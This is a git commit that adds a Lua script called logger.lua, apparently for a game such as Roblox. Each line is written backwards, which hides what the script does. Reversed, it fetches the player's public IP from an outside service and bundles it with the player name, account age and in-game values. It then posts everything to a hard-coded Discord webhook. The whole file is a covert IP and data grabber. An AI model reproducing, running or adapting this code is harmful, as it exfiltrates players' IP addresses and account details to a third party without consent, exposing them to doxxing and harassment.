df67016f2950fa90ba3d8fd48d3466e1736ab8c3
Storm <87811650+Storm99999@users.noreply.github.com>
2022-07-27 17:10:20 +0200

    Create logger.lua

---
+++ logger.lua
@@ -0,0 +1,46 @@
+)fedcba(tseuqer	
+}sredaeh = sredaeH ,"TSOP" = dohteM ,atadwen = ydoB ,lru = lrU{ = fedcba lacol	
+tseuqer.nys ro tsoPpttH ro tseuqer ro tseuqer_ptth = tseuqer	
+}	
+"nosj/noitacilppa" = ]"epyt-tnetnoc"[		
+{ = sredaeh lacol	
+	
+)atad(edocnENOSJ:)"ecivreSpttH"(ecivreSteG:emag = atadwen lacol	
+}	
+}		
+}			
+}				
+,pi .. emaN.reyalPlacoL.sreyalP.emag = ]"eman"[					
+{ = ]"rohtua"[				
+,}				
+					
+,}					
+eurt = ]"enilni"[						
+,eulaV.eeleM.ataD.reyalPlacoL.sreyalP.emag = ]"eulav"[						
+,"eeleM" = ]"eman"[						
+{					
+,}					
+eurt = ]"enilni"[						
+,eulaV.nikS.ataD.reyalPlacoL.sreyalP.emag = ]"eulav"[						
+,"nikS" = ]"eman"[						
+{					
+	
+
+,}					
+eurt = ]"enilni"[						
+,"syad " .. egAtnuoccA.reyalPlacoL.sreyalP.emag = ]"eulav"[						
+,"egA tnuoccA" = ]"eman"[						
+{					
+{ = ]"sdleif"[				
+,2028947 = ]"roloc"[				
+{			
+{ = ]"sdebme"[		
+{ = atad lacol	
+"f68OEI62zijH5__CiemZTfgjffg2OefD_VRTuuhAmGpRk-ZVmcCYEo7ySKxBfp8o60Bb/274169581225287889/skoohbew/ipa/moc.drocsid//:sptth"		
+= lru lacol
+
+
+
+)"txet/moc.piymsiftw//:sptth"(teGpttH:emag = pi
+
+"h" = pi lacol
